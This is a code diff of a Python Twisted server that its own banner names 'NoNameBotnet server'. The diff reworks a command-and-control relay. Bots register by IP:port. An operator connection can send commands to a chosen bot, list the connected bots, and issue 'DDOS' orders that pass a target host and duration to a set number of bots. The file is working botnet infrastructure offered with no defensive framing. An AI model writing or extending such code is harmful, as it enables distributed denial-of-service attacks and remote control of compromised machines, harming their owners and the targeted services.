@@ -3,123 +3,155 @@
 from twisted.internet import protocol, reactor, endpoints
 from twisted.internet.task import LoopingCall
 
-#Messages for the clients
-c_message = {} 
-#Messages for the master
-m_message = []
+#Messages for peers
+peer_msg = [] 
+#Messages for master
+client_msg = []
 #List of ip connected
 ip_list = []
 #Number of connected clients
 cnt_clients = 0
 
-class echoClient(protocol.Protocol):
+class echoPeer(protocol.Protocol):
     def __init__(self, factory):
         self.factory = factory
-
+    
     def connectionMade(self):
         global cnt_clients
         global ip_list
         self.peer_host = self.transport.getPeer().host
         self.peer_port = self.transport.getPeer().port
-        self.hostport = ''.join([self.peer_host, str(self.peer_port)])
-        self.factory.clients[self.hostport] = self
-        ip_list.append(self.hostport)
-        print('[*]Client %s:%s connected' %(self.peer_host, self.peer_port))
+        self.peer_id = ':'.join([self.peer_host, str(self.peer_port)]) #Bot ID 
+        self.factory.peers[self.peer_id] = self #Peers connection
+        ip_list.append(self.peer_id)
         cnt_clients += 1
-        print('[%s]Clients status' %(cnt_clients))		
+        print('[*] Peer %s:%s connected' %(self.peer_host, self.peer_port))
+        print('[#] Status [%s]' %(cnt_clients))		
 
     def connectionLost(self, reason):
         global cnt_clients
         global ip_list
+        self.factory.peers.pop(self.peer_id, None)
         cnt_clients -= 1
-        self.factory.clients.pop(self.hostport, None)
-        ip_list.remove(self.hostport)  
-        print('[*] Client %s:%s disconnected' %(self.peer_host, self.peer_port))
-        print('[%s] Client status ' %(cnt_clients))
-    
+        ip_list.remove(self.peer_id)  
+        print('[*] Peer %s:%s disconnected' %(self.peer_host, self.peer_port))
+        print('[#] Status [%s] ' %(cnt_clients))
+
+    #Data received from bot
     def dataReceived(self, data):
-        print("[DEBUG] Data received from [%s] -> [%s]" %(self.peer_host, data))
-        global m_message
+        print("[DEBUG] Data received from [%s] -> [%s]" %(self.peer_id, data))
+        global client_msg
         data = data.decode('utf-8', 'ignore')
-        #Extract data from json
-        #for command, response in data.items():
-        #    m_message[command] = response		
-        print(data) 
-        #[TEST ONLY] --> STRING
-        m_message.append(data)
+        #TODO Parse data received
+        #New message for client
+        client_msg.append(data)
 
-class clientFactory(protocol.Factory):
-    def __init__(self):
-        self.clients = {}
-        
+class peerFactory(protocol.Factory):
+    def __init__(self): 
+        self.peers = {}
+
+        #Broadcast data to peers
         def broadcast_msg():
-            global c_message
-            rmList = []
-            if c_message:
-                print('message %s' %(c_message))
-                for ip, msg in c_message.items():
-                    for bip, connection in self.clients.items():
-                        #Check if the ip i want to send the message is active
-                        if ip == bip:
-                            rmList.append(ip)
-                            self.clients[bip].transport.write(msg.encode('utf-8'))
-                if rmList:
-                    for ip in rmList:
-                        c_message.pop(ip, None)
-
+            global peer_msg
+            if peer_msg:
+                app_peer_msg = peer_msg
+                for message in app_peer_msg:
+                    op = message.split('::')[0]
+                    msg = message.split('::')
+                    if op == 'CMD': 
+                        pid = msg[1] #Peer ID
+                        peer_cmd = msg[2]
+                        for peer_id, connection in self.peers.items(): 
+                            #Match peer id of messagge with the id of peers connection
+                            if pid == peer_id:
+                                print('[DEBUG] Message [%s] to peer %s' %(peer_cmd, pid))
+                                self.peers[peer_id].transport.write(peer_cmd.encode('utf-8'))
+                                peer_msg.remove(message)
+                    
+                    elif op == 'DDOS':
+                        ddos_msg = msg[2]
+                        max_peers = int(msg[1])
+                        n_peers = 1
+                        print('[DEBUG] Sending ddos request...')
+                        for peer_id, connection in self.peers.items():
+                            if n_peers <= max_peers:
+                                self.peers[peer_id].transport.write(ddos_msg.encode('utf-8'))
+                                n_peers += 1
+                        peer_msg.remove(message)
+                    
+                    else:
+                        peer_msg.remove(message)
+                
         self.looping_call = LoopingCall(broadcast_msg)
         self.looping_call.start(0.1)
-
+    
     def buildProtocol(self, addr):
-        return echoClient(self)
+        return echoPeer(self)
 
-class echoMaster(protocol.Protocol):
+class echoClient(protocol.Protocol):
     def connectionMade(self):
         self.master_host = self.transport.getPeer().host
         print('*- Master [%s] connected -*' %(self.master_host))
-       # send_ip = ":".join(ip_list)
-       # self.transport.write(send_ip.encode('utf-8'))
 
     def connectionLost(self, reason):
         print('*- Master [%s] disconnected -*' %(self.master_host))
 
+    #Data received from client
     def dataReceived(self, data):
-        global c_message
+        global peer_msg
         global ip_list
         data = data.decode('utf-8')
         if '*' in data:
             p_data = data.split('*')
-            peer_ip = p_data[0]
-            peer_msg = p_data[1]
-            if peer_ip != 'null':
-                c_message[peer_ip] = peer_msg
-                print('[DEBUG] Message for bot [%s]' %c_message)
+            msg_type = p_data[0]
+            if msg_type == 'CMD':
+                #1 - host | 2 - command
+                message = '::'.join(['CMD', p_data[1], p_data[2]])
+                peer_msg.append(message)
                 self.startBroadcast()
+            elif msg_type == 'DDOS':
+                print('[DEBUG] Time %s - peers %s - host %s' %(p_data[1], p_data[2], p_data[3]))
+                ddos_msg = ':'.join([p_data[2], p_data[3]])
+                max_peers = p_data[1]
+                msg = '::'.join(['DDOS',max_peers, ddos_msg])
+                peer_msg.append(msg)
+            #If peer_ip is null, client is asking for the peers connected
             else:
-                send_ip = ':'.join(ip_list)
+                send_ip = '*'.join(ip_list)
                 self.transport.write(send_ip.encode('utf-8'))
         else:
             pass
 
+    #Broadcast data to client
     def startBroadcast(self): 
         def broadcast():
-            global m_message
-            rmList = []
-            if m_message:
-                for msg in m_message:
+            global client_msg
+            if client_msg:
+                app_client_msg = client_msg
+                for msg in app_client_msg:
+                    print('[DEBUG] Message to client --> %s' %msg)
                     self.transport.write(msg.encode('utf-8')) 
-                    rmList.append(msg)
-                for ms in rmList:
-                    m_message.remove(ms)
-                    looping_call.stop()
+                    client_msg.remove(msg)
+                looping_call.stop()
+
         looping_call = LoopingCall(broadcast)
         looping_call.start(0.1)
 
-class masterFactory(protocol.Factory):
+class clientFactory(protocol.Factory):
     def buildProtocol(self, addr):
-        return echoMaster()
+        return echoClient()
  
-if __name__ == '__main__': 
-    endpoints.serverFromString(reactor, "tcp:8081:interface=167.99.194.11").listen(clientFactory())
-    endpoints.serverFromString(reactor, "tcp:8080:interface=167.99.194.11").listen(masterFactory())
+if __name__ == '__main__':
+    print("""\
+    _   __      _   __                     ____        __             __ 
+   / | / /___  / | / /___ _____ ___  ___  / __ )____  / /_____  ___  / /_
+  /  |/ / __ \/  |/ / __ `/ __ `__ \/ _ \/ __  / __ \/ __/ __ \/ _ \/ __/
+ / /|  / /_/ / /|  / /_/ / / / / / /  __/ /_/ / /_/ / /_/ / / /  __/ /_  
+/_/ |_/\____/_/ |_/\__,_/_/ /_/ /_/\___/_____/\____/\__/_/ /_/\___/\__/  
+                                                      ______ _____  _____ ____
+                                                     (_-< -_) __/ |/ / -_) __/
+                                                    /___|__/_/  |___/\__/_/   
+    """)                                                                          
+    endpoints.serverFromString(reactor, "tcp:8081:interface=127.0.0.1").listen(peerFactory())
+    endpoints.serverFromString(reactor, "tcp:8080:interface=167.99.194.11").listen(clientFactory())
     reactor.run()
